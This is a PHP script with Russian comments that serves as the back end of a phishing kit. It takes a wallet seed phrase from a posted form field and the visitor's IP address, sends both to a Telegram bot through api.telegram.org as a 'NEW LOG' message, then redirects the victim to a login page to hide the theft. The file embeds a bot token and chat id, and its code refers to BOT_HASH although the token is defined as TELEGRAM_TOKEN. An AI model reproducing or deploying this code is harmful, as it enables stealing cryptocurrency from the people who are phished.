<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather

define('TELEGRAM_TOKEN', '1914810643:AAE5ZYnaBokUphhdx324az5B_FXBPDiqa4Eo');

//Сюда вставляем chat_id

$chat_id = '1711002364'; //YOUR CHAT ID

//Определяем переменные для передачи данных из нашей формы

$ip = $_SERVER['REMOTE_ADDR'];

$phrase = ($_POST['phrase']);

//Собираем в массив то, что будет передаваться боту

$arr = array(

    'IP: ' => $ip,

    'Сид: ' => $phrase,

);

$txt = "🧸🧸 NEW LOG 🧸🧸\n\n";

//Настраиваем внешний вид сообщения в телеграме

foreach ($arr as $key => $value) {

    $txt .= "🚀" . $key . " " . $value . "\n";

};

function message_to_telegram($text, $chat_id)

{

    $ch = curl_init();

    curl_setopt_array(

        $ch,

        array(

            CURLOPT_URL => 'https://api.telegram.org/bot' . BOT_HASH . '/sendMessage',

            CURLOPT_POST => TRUE,

            CURLOPT_RETURNTRANSFER => TRUE,

            CURLOPT_TIMEOUT => 10,

            CURLOPT_POSTFIELDS => array(

                'chat_id' => $chat_id,

                'text' => $text,

            ),

        )

    );

    curl_exec($ch);

}

message_to_telegram($txt, $chat_id);

header("Location: /login_main.html");

exit( );

?>
